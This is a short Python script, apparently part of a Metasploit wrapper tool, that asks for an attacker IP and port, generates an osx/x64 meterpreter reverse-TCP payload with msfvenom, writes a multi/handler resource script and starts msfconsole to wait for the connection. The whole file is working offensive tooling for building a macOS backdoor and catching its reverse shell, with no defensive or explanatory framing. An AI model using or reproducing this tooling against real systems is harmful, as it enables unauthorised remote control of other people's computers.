#CREADO POR GEERXOS GITHUB: https://github.com/GeerxOS

import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""

def osx64tcp():
    os.system("clear")
    print(banner)
    print("Using: osx/x64/meterpreter_reverse_tcp")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the file: ")
    print("Ok!")
    print("+---------------------------------------------------")
    print("+-> Payload data")
    print("+-> Payload: osx/x64/meterpreter_reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST="+ip+" LPORT="+port+" -f macho >> "+name+".bin")
    print("Payload created! [01]")
    print("Saved in "+name+".bin")
    print("Running metasploit-framework...")
    os.system("touch osx64_tcp.rb")
    file = open("osx64_tcp.rb", "w")
    file.write(f'''
use exploit/multi/handler
set payload osx/x64/meterpreter_reverse_tcp
set lhost = {ip}
set lport = {port}
exploit''')
    file.close
    os.system("gnome-terminal -- msfconsole -r osx64_tcp.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")